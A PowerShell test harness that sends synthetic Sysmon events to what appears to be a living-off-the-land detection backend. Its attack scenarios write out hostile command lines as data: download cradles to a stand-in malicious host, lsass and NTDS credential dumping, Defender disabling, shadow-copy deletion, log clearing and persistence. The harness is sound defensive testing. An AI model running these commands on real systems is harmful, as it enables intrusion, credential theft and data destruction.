param(
    [string]$Backend = "http://192.168.10.20:8080/ingest",
    [string]$Computer = "TEST-PC",
    [switch]$DryRun
)

$script:RecordId = 1000
$script:Stats = @{ Sent = 0; Failed = 0 }

function New-SysmonEvent {
    param(
        [string]$Image,
        [string]$ParentImage = "C:\Windows\explorer.exe",
        [string]$CommandLine,
        [int]$EventId = 1,
        [hashtable]$Extra = @{}
    )
    $script:RecordId++
    $data = @{
        Image       = $Image
        ParentImage = $ParentImage
        CommandLine = $CommandLine
    }
    foreach ($k in $Extra.Keys) { $data[$k] = $Extra[$k] }
    [pscustomobject]@{
        record_id    = $script:RecordId
        event_id     = $EventId
        level        = 4
        provider     = "Microsoft-Windows-Sysmon"
        channel      = "Microsoft-Windows-Sysmon/Operational"
        computer     = $Computer
        time_created = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ")
        data         = $data
    }
}

function Send-Scenario {
    param(
        [string]$HostIp,
        [string]$Label,
        [object[]]$Events
    )
    $payload = @{
        agent   = "test_harness"
        version = "1.0.0"
        host_ip = $HostIp
        events  = $Events
    } | ConvertTo-Json -Depth 8 -Compress

    if ($DryRun) {
        Write-Host ("  [{0,-13}] {1}" -f $HostIp, $Label) -ForegroundColor Gray
        return
    }

    try {
        Invoke-RestMethod -Uri $Backend -Method Post -Body $payload -ContentType "application/json" -TimeoutSec 10 | Out-Null
        $script:Stats.Sent++
        Write-Host ("  [{0,-13}] {1}" -f $HostIp, $Label) -ForegroundColor Green
    }
    catch {
        $script:Stats.Failed++
        Write-Host ("  [{0,-13}] {1}  FAIL: {2}" -f $HostIp, $Label, $_.Exception.Message) -ForegroundColor Red
    }
    Start-Sleep -Milliseconds 80
}

Write-Host ""
Write-Host "Backend: $Backend" -ForegroundColor Yellow
Write-Host ""

Write-Host "==> YARA tier (10)" -ForegroundColor Cyan

Send-Scenario "10.99.1.1" "Office spawns PowerShell with -enc" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
        -ParentImage "C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE" `
        -CommandLine "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALwBwAGEAeQBsAG8AYQBkAC4AcABzADEAJwApAA=="
)

Send-Scenario "10.99.1.2" "PowerShell IEX DownloadString cradle" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
        -ParentImage "C:\Windows\explorer.exe" `
        -CommandLine "powershell.exe -nop -w hidden -c `"IEX (New-Object Net.WebClient).DownloadString('http://malicious.example/loader.ps1')`""
)

Send-Scenario "10.99.1.3" "mshta remote HTA payload" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\mshta.exe" `
        -ParentImage "C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" `
        -CommandLine "mshta.exe http://malicious.example/payload.hta"
)

Send-Scenario "10.99.1.4" "Regsvr32 Squiblydoo (scrobj.dll)" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\regsvr32.exe" `
        -ParentImage "C:\Windows\explorer.exe" `
        -CommandLine "regsvr32.exe /s /n /u /i:http://malicious.example/file.sct scrobj.dll"
)

Send-Scenario "10.99.1.5" "Certutil URL cache download" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\certutil.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "certutil.exe -urlcache -split -f http://malicious.example/payload.exe C:\Users\Public\p.exe"
)

Send-Scenario "10.99.1.6" "Certutil decode base64 blob" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\certutil.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "certutil -decode C:\Users\Public\b64.txt C:\Users\Public\out.exe"
)

Send-Scenario "10.99.1.7" "Bitsadmin /transfer HTTP download" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\bitsadmin.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "bitsadmin /transfer myJob /priority normal http://malicious.example/p.exe C:\Users\Public\p.exe"
)

Send-Scenario "10.99.1.8" "WMIC remote process call create" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\wbem\WMIC.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "wmic /node:192.168.10.50 /user:Administrator /password:Pass1 process call create `"cmd.exe /c whoami > C:\Users\Public\out.txt`""
)

Send-Scenario "10.99.1.9" "Rundll32 comsvcs MiniDump (lsass)" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\rundll32.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "rundll32.exe C:\Windows\System32\comsvcs.dll,MiniDump 624 C:\Users\Public\lsass.dmp full"
)

Send-Scenario "10.99.1.10" "Schtasks /create /ru SYSTEM + powershell" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\schtasks.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "schtasks /create /tn Updater /tr `"powershell -nop -w hidden -ec ZQBjAGgAbwAgAGgAaQA=`" /sc onstart /ru system /f"
)

Write-Host ""
Write-Host "==> ML tier (10)" -ForegroundColor Cyan

Send-Scenario "10.99.2.1" "Suspicious PS flags without -enc/IEX" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\Users\Public\stage2.ps1"
)

Send-Scenario "10.99.2.2" "PsExec lateral movement" @(
    New-SysmonEvent `
        -Image "C:\Users\Public\PsExec64.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "PsExec64.exe \\dc01.corp.local -accepteula -s -d cmd.exe /c `"net user backup BackupPass1! /add`""
)

Send-Scenario "10.99.2.3" "Concat-obfuscated IEX (string-split bypass)" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
        -ParentImage "C:\Windows\explorer.exe" `
        -CommandLine "powershell.exe -c `"& ('I'+'E'+'X') ((New-Object Net.We`bClient).Down`loadStr`ing('htt'+'p://m'+'al.exa'+'mple/x'))`""
)

Send-Scenario "10.99.2.4" "Reg add RunOnce persistence" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\reg.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v UpdateChecker /t REG_SZ /d `"C:\Users\Public\svc.exe`" /f"
)

Send-Scenario "10.99.2.5" "WMIC local process call create" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\wbem\WMIC.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "wmic process call create `"cmd.exe /c C:\Users\Public\evil.exe`""
)

Send-Scenario "10.99.2.6" "Runas /netonly /savecred (token reuse)" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\runas.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "runas /user:CORP\Administrator /netonly /savecred `"cmd.exe /c \\dc01\C$\Windows\System32\notepad.exe`""
)

Send-Scenario "10.99.2.7" "sc.exe create service to user-writable path" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\sc.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "sc.exe create LegitSvc binpath= `"C:\Users\Public\backdoor.exe -k`" start= auto displayname= `"Legit Update Service`""
)

Send-Scenario "10.99.2.8" "Mass file rename (ransomware-like)" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\cmd.exe" `
        -ParentImage "C:\Users\Public\encryptor.exe" `
        -CommandLine "cmd.exe /c for /r C:\Users\victim\Documents %i in (*.docx *.xlsx *.pdf) do ren `"%i`" `"%i.locked`""
)

Send-Scenario "10.99.2.9" "ntdsutil snapshot of NTDS.dit" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\ntdsutil.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "ntdsutil.exe `"ac i ntds`" `"ifm`" `"create full C:\Users\Public\dump`" q q"
)

Send-Scenario "10.99.2.10" "Disable Defender via Add-MpPreference" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "powershell.exe -Command `"Set-MpPreference -DisableRealtimeMonitoring `$true; Add-MpPreference -ExclusionPath 'C:\Users\Public'`""
)

Write-Host ""
Write-Host "==> LLM tier (10)" -ForegroundColor Cyan

Send-Scenario "10.99.3.1" "AD recon chain (whoami/net/nltest/systeminfo)" @(
    (New-SysmonEvent -Image "C:\Windows\System32\whoami.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "whoami /priv"),
    (New-SysmonEvent -Image "C:\Windows\System32\net.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "net group `"Domain Admins`" /domain"),
    (New-SysmonEvent -Image "C:\Windows\System32\nltest.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "nltest /domain_trusts /all_trusts"),
    (New-SysmonEvent -Image "C:\Windows\System32\systeminfo.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "systeminfo")
)

Send-Scenario "10.99.3.2" "lsass.exe accessed by non-standard process" @(
    (New-SysmonEvent -EventId 10 -Image "C:\Users\Public\helper.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "" -Extra @{
            TargetImage    = "C:\Windows\System32\lsass.exe"
            GrantedAccess  = "0x1010"
            CallTrace      = "C:\Windows\SYSTEM32\ntdll.dll+9d234|UNKNOWN(00007FFA8D2C0000)"
            SourceImage    = "C:\Users\Public\helper.exe"
            SourceUser     = "CORP\jsmith"
        })
)

Send-Scenario "10.99.3.3" "Office macro -> mshta -> cmd (subtle chain)" @(
    (New-SysmonEvent -Image "C:\Windows\System32\mshta.exe" -ParentImage "C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE" -CommandLine "mshta.exe vbscript:CreateObject(`"WScript.Shell`").Run(`"cmd /c whoami > %TEMP%\o.txt`",0,true)(window.close)"),
    (New-SysmonEvent -Image "C:\Windows\System32\cmd.exe" -ParentImage "C:\Windows\System32\mshta.exe" -CommandLine "cmd /c whoami > %TEMP%\o.txt")
)

Send-Scenario "10.99.3.4" "Shadow copy delete + bcdedit recovery off" @(
    (New-SysmonEvent -Image "C:\Windows\System32\vssadmin.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "vssadmin.exe delete shadows /all /quiet"),
    (New-SysmonEvent -Image "C:\Windows\System32\wbem\WMIC.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "wmic shadowcopy delete"),
    (New-SysmonEvent -Image "C:\Windows\System32\bcdedit.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "bcdedit /set {default} recoveryenabled No"),
    (New-SysmonEvent -Image "C:\Windows\System32\bcdedit.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "bcdedit /set {default} bootstatuspolicy ignoreallfailures")
)

Send-Scenario "10.99.3.5" "Defender disabled via PS Set-MpPreference" @(
    (New-SysmonEvent -Image "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "powershell -Command `"Set-MpPreference -DisableScriptScanning 1; Set-MpPreference -DisableBehaviorMonitoring 1; Set-MpPreference -MAPSReporting Disabled`""),
    (New-SysmonEvent -Image "C:\Windows\System32\sc.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "sc stop WinDefend"),
    (New-SysmonEvent -Image "C:\Windows\System32\sc.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "sc config WinDefend start= disabled")
)

Send-Scenario "10.99.3.6" "Event log clearing (anti-forensics)" @(
    (New-SysmonEvent -Image "C:\Windows\System32\wevtutil.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "wevtutil.exe cl Security"),
    (New-SysmonEvent -Image "C:\Windows\System32\wevtutil.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "wevtutil.exe cl System"),
    (New-SysmonEvent -Image "C:\Windows\System32\wevtutil.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "wevtutil.exe cl Application")
)

Send-Scenario "10.99.3.7" "Credential Manager dump via rundll32" @(
    (New-SysmonEvent -Image "C:\Windows\System32\rundll32.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "rundll32.exe keymgr.dll,KRShowKeyMgr"),
    (New-SysmonEvent -Image "C:\Windows\System32\vaultcmd.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "vaultcmd /list"),
    (New-SysmonEvent -Image "C:\Windows\System32\vaultcmd.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "vaultcmd /listcreds:`"Windows Credentials`" /all")
)

Send-Scenario "10.99.3.8" "WMI persistence (EventConsumer + FilterToConsumer)" @(
    (New-SysmonEvent -Image "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "powershell -Command `"`$f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='F'; EventNamespace='root\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA Win32_PerfFormattedData_PerfOS_System'}`""),
    (New-SysmonEvent -Image "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "powershell -Command `"Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='C'; CommandLineTemplate='cmd /c C:\Users\Public\beacon.exe'}`"")
)

Send-Scenario "10.99.3.9" "DCSync via mimikatz-like syntax" @(
    (New-SysmonEvent -Image "C:\Users\Public\m.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "m.exe `"lsadump::dcsync /domain:corp.local /user:krbtgt`""),
    (New-SysmonEvent -EventId 10 -Image "C:\Users\Public\m.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "" -Extra @{
            TargetImage   = "C:\Windows\System32\lsass.exe"
            GrantedAccess = "0x1010"
            SourceImage   = "C:\Users\Public\m.exe"
        })
)

Send-Scenario "10.99.3.10" "ADCS abuse: certreq + Esc1 template" @(
    (New-SysmonEvent -Image "C:\Windows\System32\certreq.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "certreq -submit -attrib `"SAN:upn=administrator@corp.local`" -config `"CA01.corp.local\corp-CA01-CA`" C:\Users\Public\req.inf C:\Users\Public\cert.cer"),
    (New-SysmonEvent -Image "C:\Windows\System32\certutil.exe" -ParentImage "C:\Windows\System32\cmd.exe" -CommandLine "certutil -store -user My")
)

Write-Host ""
Write-Host "==> Benign / FP-bait (30)" -ForegroundColor Cyan

Send-Scenario "10.99.9.1" "Windows Update component install" @(
    New-SysmonEvent `
        -Image "C:\Windows\WinSxS\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26200.1_none\TiWorker.exe" `
        -ParentImage "C:\Windows\servicing\TrustedInstaller.exe" `
        -CommandLine "C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_10.0.26200.1_none\TiWorker.exe -Embedding"
)

Send-Scenario "10.99.9.2" "Chrome auto-update" @(
    New-SysmonEvent `
        -Image "C:\Program Files (x86)\Google\Update\GoogleUpdate.exe" `
        -ParentImage "C:\Windows\System32\svchost.exe" `
        -CommandLine "`"C:\Program Files (x86)\Google\Update\GoogleUpdate.exe`" /ua /installsource scheduler"
)

Send-Scenario "10.99.9.3" "Outlook startup" @(
    New-SysmonEvent `
        -Image "C:\Program Files\Microsoft Office\Root\Office16\OUTLOOK.EXE" `
        -ParentImage "C:\Windows\explorer.exe" `
        -CommandLine "`"C:\Program Files\Microsoft Office\Root\Office16\OUTLOOK.EXE`""
)

Send-Scenario "10.99.9.4" "Word opening a network share document" @(
    New-SysmonEvent `
        -Image "C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE" `
        -ParentImage "C:\Windows\explorer.exe" `
        -CommandLine "`"C:\Program Files\Microsoft Office\Root\Office16\WINWORD.EXE`" `"\\fileserver\share\reports\Q2.docx`""
)

Send-Scenario "10.99.9.5" "Git clone over HTTPS" @(
    New-SysmonEvent `
        -Image "C:\Program Files\Git\bin\git.exe" `
        -ParentImage "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
        -CommandLine "git clone https://github.com/contoso/project.git"
)

Send-Scenario "10.99.9.6" "npm install in dev project" @(
    New-SysmonEvent `
        -Image "C:\Program Files\nodejs\node.exe" `
        -ParentImage "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
        -CommandLine "`"C:\Program Files\nodejs\node.exe`" `"C:\Program Files\nodejs\node_modules\npm\bin\npm-cli.js`" install"
)

Send-Scenario "10.99.9.7" "Visual Studio cl.exe compilation" @(
    New-SysmonEvent `
        -Image "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\bin\Hostx64\x64\cl.exe" `
        -ParentImage "C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\devenv.exe" `
        -CommandLine "cl.exe /c /Zi /nologo /W3 /WX- /diagnostics:column /MP /Gm- /O2 /MD main.cpp"
)

Send-Scenario "10.99.9.8" "Defender quick scan" @(
    New-SysmonEvent `
        -Image "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25040.5-0\MsMpEng.exe" `
        -ParentImage "C:\Windows\System32\services.exe" `
        -CommandLine "`"MsMpEng.exe`""
)

Send-Scenario "10.99.9.9" "OneDrive sync" @(
    New-SysmonEvent `
        -Image "C:\Users\jsmith\AppData\Local\Microsoft\OneDrive\OneDrive.exe" `
        -ParentImage "C:\Windows\explorer.exe" `
        -CommandLine "`"C:\Users\jsmith\AppData\Local\Microsoft\OneDrive\OneDrive.exe`" /background"
)

Send-Scenario "10.99.9.10" "Teams startup" @(
    New-SysmonEvent `
        -Image "C:\Users\jsmith\AppData\Local\Microsoft\Teams\current\Teams.exe" `
        -ParentImage "C:\Windows\explorer.exe" `
        -CommandLine "`"Teams.exe`" --processStart `"Teams.exe`" --process-start-args `"--system-initiated`""
)

Send-Scenario "10.99.9.11" "Excel running data refresh (no shell spawn)" @(
    New-SysmonEvent `
        -Image "C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE" `
        -ParentImage "C:\Windows\explorer.exe" `
        -CommandLine "`"C:\Program Files\Microsoft Office\Root\Office16\EXCEL.EXE`" `"\\fileserver\reports\dashboard.xlsx`""
)

Send-Scenario "10.99.9.12" "SCCM client check-in" @(
    New-SysmonEvent `
        -Image "C:\Windows\CCM\CcmExec.exe" `
        -ParentImage "C:\Windows\System32\services.exe" `
        -CommandLine "C:\Windows\CCM\CcmExec.exe"
)

Send-Scenario "10.99.9.13" "Admin running gpupdate" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\gpupdate.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "gpupdate /force"
)

Send-Scenario "10.99.9.14" "Admin running sfc /scannow" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\sfc.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "sfc /scannow"
)

Send-Scenario "10.99.9.15" "DISM health restore (admin maintenance)" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\Dism.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "Dism /Online /Cleanup-Image /RestoreHealth"
)

Send-Scenario "10.99.9.16" "Get-Process via PowerShell (helpdesk)" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
        -ParentImage "C:\Windows\explorer.exe" `
        -CommandLine "powershell.exe -Command `"Get-Process | Where-Object { `$_.CPU -gt 10 } | Sort-Object CPU -Descending`""
)

Send-Scenario "10.99.9.17" "net localgroup listing (admin)" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\net.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "net localgroup Administrators"
)

Send-Scenario "10.99.9.18" "WMIC product list (admin inventory)" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\wbem\WMIC.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "wmic product get name,version"
)

Send-Scenario "10.99.9.19" "Robocopy user data backup" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\Robocopy.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "robocopy C:\Users\jsmith\Documents \\backup\users\jsmith\Documents /MIR /R:3 /W:5 /LOG:C:\Logs\backup.log"
)

Send-Scenario "10.99.9.20" "Edge browser launch" @(
    New-SysmonEvent `
        -Image "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" `
        -ParentImage "C:\Windows\explorer.exe" `
        -CommandLine "`"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe`" --single-argument https://intranet/"
)

Send-Scenario "10.99.9.21" "Notepad opening a config file" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\notepad.exe" `
        -ParentImage "C:\Windows\explorer.exe" `
        -CommandLine "notepad.exe C:\Users\jsmith\Documents\notes.txt"
)

Send-Scenario "10.99.9.22" "PowerShell legitimate script with -File" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "powershell.exe -File `"C:\Program Files\Vendor\App\maintenance.ps1`" -Verbose"
)

Send-Scenario "10.99.9.23" "Docker build" @(
    New-SysmonEvent `
        -Image "C:\Program Files\Docker\Docker\resources\bin\docker.exe" `
        -ParentImage "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" `
        -CommandLine "docker build -t myapp:latest ."
)

Send-Scenario "10.99.9.24" "Adobe Reader opens PDF" @(
    New-SysmonEvent `
        -Image "C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe" `
        -ParentImage "C:\Windows\explorer.exe" `
        -CommandLine "`"C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe`" `"C:\Users\jsmith\Downloads\invoice.pdf`""
)

Send-Scenario "10.99.9.25" "Zoom installer running" @(
    New-SysmonEvent `
        -Image "C:\Users\jsmith\AppData\Roaming\Zoom\bin\Zoom.exe" `
        -ParentImage "C:\Windows\explorer.exe" `
        -CommandLine "`"Zoom.exe`""
)

Send-Scenario "10.99.9.26" "PowerShell ISE for development" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell_ISE.exe" `
        -ParentImage "C:\Windows\explorer.exe" `
        -CommandLine "`"C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell_ISE.exe`" -File C:\Scripts\report.ps1"
)

Send-Scenario "10.99.9.27" "MSBuild from VS solution" @(
    New-SysmonEvent `
        -Image "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\amd64\MSBuild.exe" `
        -ParentImage "C:\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\devenv.exe" `
        -CommandLine "`"MSBuild.exe`" /t:Build /p:Configuration=Release C:\dev\project\App.sln"
)

Send-Scenario "10.99.9.28" "Slack desktop launch" @(
    New-SysmonEvent `
        -Image "C:\Users\jsmith\AppData\Local\slack\slack.exe" `
        -ParentImage "C:\Windows\explorer.exe" `
        -CommandLine "`"slack.exe`" --type=renderer"
)

Send-Scenario "10.99.9.29" "Schtasks listing tasks (admin)" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\schtasks.exe" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "schtasks /query /fo LIST /v"
)

Send-Scenario "10.99.9.30" "Ping diagnostic" @(
    New-SysmonEvent `
        -Image "C:\Windows\System32\PING.EXE" `
        -ParentImage "C:\Windows\System32\cmd.exe" `
        -CommandLine "ping -n 4 fileserver.corp.local"
)

Write-Host ""
Write-Host "==> Summary" -ForegroundColor Yellow
Write-Host ("    Sent OK: {0}" -f $script:Stats.Sent) -ForegroundColor Green
Write-Host ("    Failed:  {0}" -f $script:Stats.Failed) -ForegroundColor $(if ($script:Stats.Failed -gt 0) { "Red" } else { "Gray" })
Write-Host ""
Write-Host "Backend buffers each host_ip for 60 seconds before running the cascade." -ForegroundColor Gray
Write-Host "Wait ~70 seconds, then check Elasticsearch:" -ForegroundColor Gray
Write-Host "  curl 'http://192.168.10.10:9200/lotl-alerts-backend*/_search?pretty&size=50&sort=@timestamp:desc'" -ForegroundColor Gray
Write-Host ""
